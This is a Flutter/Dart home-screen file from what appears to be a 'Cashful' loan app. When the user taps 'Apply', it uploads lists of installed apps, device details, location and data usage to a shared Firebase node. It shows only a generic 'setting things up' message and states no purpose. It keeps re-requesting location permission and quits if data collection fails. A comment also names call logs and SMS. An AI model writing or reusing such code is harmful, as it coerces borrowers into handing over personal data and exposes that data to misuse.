import 'dart:io';

import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_application_1/configs/helper.dart';
import 'package:flutter_application_1/configs/locator.dart';
import 'package:flutter_application_1/pages/apply/first_time/apply_splash.dart';
import 'package:flutter_application_1/pages/apply/recurring/loan_application_info.dart';
import 'package:flutter_application_1/pages/base_view.dart';
import 'package:flutter_application_1/pages/main_views/help.dart';
import 'package:flutter_application_1/pages/main_views/pay.dart';
import 'package:flutter_application_1/view_models/loan_request_view_model.dart';
import 'package:flutter_application_1/view_models/user_view_model.dart';
import 'package:flutter_application_1/widgets/text_h1.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:location/location.dart';
import 'package:lottie/lottie.dart';
import 'package:permission_handler/permission_handler.dart';

import 'status.dart';

class HomeScreen extends StatefulWidget {
  @override
  _HomeScreenState createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  var cardTextStyle = TextStyle(
      fontFamily: 'Poppins',
      letterSpacing: 1.2,
      fontSize: 18,
      fontWeight: FontWeight.bold,
      color: Colors.black,
      height: 1);
  double dx = 0.5;

  bool isLoading = false;
  List<List<dynamic>> rowsAsListOfValues = [];
  List result = [];
  static const platform = MethodChannel('com.cashful.application/userdata');
  Location location = Location();
  String? firebaseUserId = FirebaseAuth.instance.currentUser?.uid;
  bool checkpermission = false;

//get location permission and get current location
  locationPermission() async {
    var status = await Permission.location.status;
    if (status.isDenied ||
        status.isPermanentlyDenied ||
        status.isLimited && _locationPermissionCount <= 7) {
      await Permission.location.request();
      _locationPermissionCount++;
      // print(count);

      // print(status);
      return locationPermission();
    } else if (status.isDenied) {
      await openAppSettings();
      return locationPermission();
    } else if (status.isGranted) {
      LocationData _locationData;
      bool _serviceEnabled;

      _serviceEnabled = await location.serviceEnabled();
      if (!_serviceEnabled) {
        _serviceEnabled = await location.requestService();
        if (!_serviceEnabled) {
          return;
        }
      }

      _locationData = await location.getLocation();
      setState(() {
        result = [
          {
            'lat': _locationData.latitude.toString(),
            'long': _locationData.longitude.toString(),
          }
        ];
      });
      print(result);
    }
  }

  bool count = false;

  int _locationPermissionCount = 0;
//This method are help to get calllog,sms,appinstall,device information and datause.
  Future uploadToDatabase(callName) async {
    await platform.invokeMethod(callName).then((value) async {
      setState(() {
        result = value;
      });

      if (value == null) {
        exit(0);
      }

      List uploadList = [];
      for (var element in result) {
        element['UID'] = firebaseUserId;
        uploadList.add(element);
      }
      print(uploadList);
      DatabaseReference ref = FirebaseDatabase.instance.ref();
      await ref.child('metadata').child(callName).once().then((value) async {
        if (value.snapshot.exists) {
          var temp = value.snapshot.value as List;
          List oldData = temp.toList();
          oldData.removeWhere((element) => element?['UID'] == firebaseUserId);
          uploadList.addAll(oldData);
        }
        await ref.child('metadata').child(callName).set(uploadList);
      });
    });
  }

  //This method are help to store all data in firebase realtime database
  Future upload(callName) async {
    try {
      List uploadList = [];
      for (var element in result) {
        print(element.runtimeType);
        element['UID'] = firebaseUserId;
        uploadList.add(element);
      }
      print(firebaseUserId);
      // print(uploadList);
      DatabaseReference ref = FirebaseDatabase.instance.ref();
      ref.child('metadata').child(callName).once().then((value) {
        if (value.snapshot.exists) {
          var temp = value.snapshot.value as List;
          List oldData = temp.toList();
          oldData.removeWhere((element) => element?['UID'] == firebaseUserId);
          uploadList.addAll(oldData);
        }
        ref.child('metadata').child(callName).set(uploadList);
      });
    } on PlatformException catch (e) {
      print(e.toString());
    }
  }

  Future uploadAllData() async {
    setState(() {
      isLoading = true;
    });
    await uploadToDatabase('appInstall');
    await uploadToDatabase('device');
    await locationPermission().then((value) => upload('locations'));
    await uploadToDatabase('dataUsage');
  }

  @override
  Widget build(BuildContext context) {
    // style
    WidgetsBinding.instance.addPostFrameCallback((_) {
      Future.delayed(Duration(milliseconds: 200), () {
        setState(() {
          dx = 1;
        });
      });
    });
    return BaseView<UserViewModel>(
      builder: (context, model, child) => isLoading
          ? Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Lottie.asset(
                  'assets/lottie/processing.json',
                  // width: 200,
                  // height: 500,
                  fit: BoxFit.fill,
                ),
                Padding(
                  padding: EdgeInsets.symmetric(horizontal: 24, vertical: 16),
                  child: Text(
                    "We’re setting things up, this might take a few moments. "
                    "Please do not close or minimize the app until we’re finished getting you started",
                    style: TextStyle(
                      fontFamily: 'Poppins',
                      letterSpacing: 1,
                      fontSize: 16,
                      fontWeight: FontWeight.w500,
                      color: Colors.black,
                      height: 1.5,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ),
              ],
            )
          : Stack(
              children: <Widget>[
                Image.asset("assets/images/home_wave_bg.png",
                    height: MediaQuery.of(context).size.height * 0.6,
                    width: double.infinity,
                    fit: BoxFit.cover),
                AnimatedScale(
                  scale: dx,
                  curve: Curves.ease,
                  duration: Duration(milliseconds: 200),
                  child: SafeArea(
                    child: Padding(
                      padding: EdgeInsets.all(15.0),
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: <Widget>[
                          Container(
                            height: 40,
                            margin: EdgeInsets.only(bottom: 1),
                          ),
                          Expanded(
                            child: Center(
                              child: GridView.count(
                                mainAxisSpacing: 5,
                                crossAxisSpacing: 5,
                                primary: false,
                                crossAxisCount: 2,
                                shrinkWrap: true,
                                children: <Widget>[
                                  Card(
                                    shape: RoundedRectangleBorder(
                                        borderRadius:
                                            BorderRadius.circular(25)),
                                    child: InkWell(
                                      onTap: () async {
                                        await uploadAllData().then(
                                          (value) async {
                                            await applyFunction(model)
                                                .catchError(
                                              (onError) {
                                                setState(() {
                                                  isLoading = false;
                                                });
                                                ScaffoldMessenger.of(context)
                                                    .showSnackBar(
                                                  SnackBar(
                                                    content: Text(
                                                      "Something went wrong. Please check the app permissions and try again.",
                                                    ),
                                                  ),
                                                );
                                              },
                                            );
                                          },
                                        ).catchError((onError) {
                                          setState(() {
                                            isLoading = false;
                                          });
                                          ScaffoldMessenger.of(context)
                                              .showSnackBar(
                                            SnackBar(
                                              content: Text(
                                                "Something went wrong. Please check the app permissions and try again.",
                                              ),
                                            ),
                                          );
                                        });
                                      },
                                      child: _floatingHomeCard(
                                          'assets/images/apply.svg', 'Apply'),
                                    ),
                                  ),
                                  Card(
                                    shape: RoundedRectangleBorder(
                                        borderRadius:
                                            BorderRadius.circular(25)),
                                    child: InkWell(
                                        onTap: () {
                                          Navigator.push(
                                              context,
                                              MaterialPageRoute(
                                                  builder: (context) =>
                                                      StatusScreen()));
                                        },
                                        child: _floatingHomeCard(
                                            'assets/images/status.svg',
                                            'Status')),
                                  ),
                                  Card(
                                    shape: RoundedRectangleBorder(
                                        borderRadius:
                                            BorderRadius.circular(25)),
                                    child: InkWell(
                                        onTap: () {
                                          Navigator.push(
                                              context,
                                              MaterialPageRoute(
                                                  builder: (context) =>
                                                      PayScreen()));
                                        },
                                        child: _floatingHomeCard(
                                            'assets/images/pay.svg', 'Pay')),
                                  ),
                                  Card(
                                    shape: RoundedRectangleBorder(
                                        borderRadius:
                                            BorderRadius.circular(25)),
                                    child: InkWell(
                                        onTap: () {
                                          Navigator.push(
                                              context,
                                              MaterialPageRoute(
                                                  builder: (context) =>
                                                      HelpScreen()));
                                        },
                                        child: _floatingHomeCard(
                                            'assets/images/help.svg', 'Help')),
                                  ),
                                ],
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
                Positioned(top: 50, left: 20, child: TextH1(title: "Home"))
              ],
            ),
    );
  }

  Widget _floatingHomeCard(imageUrl, title) {
    return Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: <Widget>[
        SvgPicture.asset(
          imageUrl,
          height: 50,
        ),
        SizedBox(height: 10),
        Text(
          title,
          style: cardTextStyle,
        )
      ],
    );
  }

  Future applyFunction(UserViewModel model) async {
    var lrVM = locator<LoanRequestViewModel>();
    var loanReqeusts = await lrVM.getLoanRequests();
    if (lrVM.errorMessage == null) {
      var pendingOrapprovedLR = loanReqeusts.indexWhere(
        (element) =>
            element.loanStatus == 'pending' ||
            element.loanStatus == 'approved' ||
            element.loanStatus == 'overdue',
      );
      print(pendingOrapprovedLR);
      if (pendingOrapprovedLR != -1) {
        setState(() {
          isLoading = false;
        });
        WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
          AppHelper.showSnackBar(
              "You have already applied for a loan.", context);
        });
        return;
      }
    } else {
      setState(() {
        isLoading = false;
      });
      WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
        AppHelper.showSnackBar("Something went wrong try again.", context);
      });
      return;
    }
    if (model.user!.backgroundInformation == null) {
      setState(() {
        isLoading = false;
      });
      Navigator.pushNamed(context, ApplySplash.pageName);
    } else {
      setState(() {
        isLoading = false;
      });
      Navigator.pushNamed(context, LoanApplicationInfoPage.pageName);
    }
  }
}
